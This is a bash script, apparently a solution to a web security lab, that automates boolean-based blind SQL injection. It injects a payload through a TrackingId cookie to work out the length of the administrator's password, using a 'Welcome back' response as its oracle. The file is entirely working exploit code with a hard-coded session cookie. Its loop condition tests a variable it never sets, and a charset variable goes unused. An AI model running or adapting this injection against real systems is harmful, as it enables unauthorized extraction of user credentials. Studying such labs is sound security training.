#!/bin/bash


charset=`echo {0..9} {a..z}`
export URL=$1
export response="Welcome back"



for ((i=1;j<50;i+=1))
do
    curl -s -H "Cookie: TrackingId=pDjNZQI9hKYP5WZl'+AND+(SELECT+'a'+FROM+users+WHERE+username%3d'administrator'+AND+LENGTH(password)>$i)%3d'a; session=Fp00gpHJtB7IKAiXVQ3CHHcGQ2E0cYdt"  \
    "$URL" | grep "$response" &> /dev/null
    if [ "$?" == "0" ]
    then
        continue
    else
        export passlen=$i
        break
    fi
done

echo Password Length: $passlen 
